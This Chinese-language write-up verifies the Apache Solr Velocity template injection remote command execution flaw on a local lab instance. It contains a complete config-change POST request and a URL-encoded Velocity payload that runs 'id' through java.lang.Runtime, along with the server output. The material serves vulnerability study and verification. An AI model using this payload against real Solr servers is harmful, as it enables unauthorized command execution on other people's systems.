## Apache Solr Velocity模版注入远程命令执行漏洞验证

### 1.背景

2019年10月31日，国内安全媒体纰漏，国外的安全研究员S00pY在GitHub发布了Apache Solr Velocity模版注入远程命令执行的poc，经验POC真实有效，定级为严重；  

国内媒体的预警： https://mp.weixin.qq.com/s/RWG7nxwCMtlyPnookXlaLA  

### 2. 漏洞详情

1. 当攻击者可以直接访问Solr控制台时，可以通过发送类似/节点名/config的POST请求对该节点的配置文件做更改。  
2. Apache Solr默认集成VelocityResponseWriter插件，在该插件的初始化参数中的   params.resource.loader.enabled这个选项是用来控制是否允许参数资源加载器在Solr请求参数中指定模版，默认设置是false。   
3. 当设置params.resource.loader.enabled为true时，将允许用户通过设置请求中的参数来指定相关资源的加载，这也就意味着攻击者可以通过构造一个具有威胁的攻击请求，在服务器上进行命令执行。



### 3. 漏洞验证 

### 1. 下载solr-6.6.0，运行开启服务

	/Users/snow/Files/solr-6.6.0/bin
	bogon:bin snow$ ls
	init.d                  post                    solr.in.cmd
	install_solr_service.sh solr                    solr.in.sh
	oom_solr.sh             solr.cmd
	bogon:bin snow$ ./solr -e dih
	
	Starting up Solr on port 8983 using command:
	"/Users/snow/Files/solr-6.6.0/bin/solr" start -p 8983 -s "/Users/snow/Files/solr-6.6.0/example/example-DIH/solr"
	
	Waiting up to 180 seconds to see Solr running on port 8983 [\]
	Started Solr server on port 8983 (pid=24330). Happy searching!

	Solr dih example launched successfully. Direct your Web browser to http://localhost:8983/solr to visit the Solr Admin UI
	bogon:bin snow$
	
访问服务：http://localhost:8983/solr/#/   
![](https://github.com/shadow-horse/VulnerabilityAnalysis/blob/master/Apache%20Solr/velocity%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/localhostpng.png)

### 2. 访问具体的节点，查看conf配置 
![](https://github.com/shadow-horse/VulnerabilityAnalysis/blob/master/Apache%20Solr/velocity%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/nodes.png)  

![](https://github.com/shadow-horse/VulnerabilityAnalysis/blob/master/Apache%20Solr/velocity%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/config.png)


### 3. 更改配置，执行命令

1. 利用config，更改配置，通过POST提交JSON格式请求

		POST /solr/solr/config HTTP/1.1
		Host: localhost:8983
		Content-Type: application/json
		Content-Length: 259
		
		{
 		 "update-queryresponsewriter": {
   		 "startup": "lazy",
   		 "name": "velocity",
   		 "class": "solr.VelocityResponseWriter",
   		 "template.base.dir": "",
   		 "solr.resource.loader.enabled": "true",
   		 "params.resource.loader.enabled": "true"
 		 }
		}
		
		
		HTTP/1.1 200 OK
		Content-Type: text/plain;charset=utf-8
		Content-Length: 149

		{
  		"responseHeader":{
  			"status":0,
    		"QTime":263},
  		"WARNING":"This response format is experimental.  It is likely to change in the future."}  
  		
  		

2. 执行命令：  
select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end

		GET /solr/solr/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1
		Host: localhost:8983
		Content-Length: 2
		User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0
		Accept: application/json,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
		Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
		Accept-Encoding: gzip, deflate
		Connection: close
		Upgrade-Insecure-Requests: 1
		Content-Length: 0

		
		
		HTTP/1.1 200 OK
		Content-Type: text/html;charset=utf-8
		Content-Length: 344

 		0 uid=501(snow) gid=20(staff) groups=20(staff),501(access_bpf),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),701(com.apple.sharepoint.group.1),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh)  
 		
 		




参考：   
https://mp.weixin.qq.com/s/RWG7nxwCMtlyPnookXlaLA   
 
https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt  

https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt  

	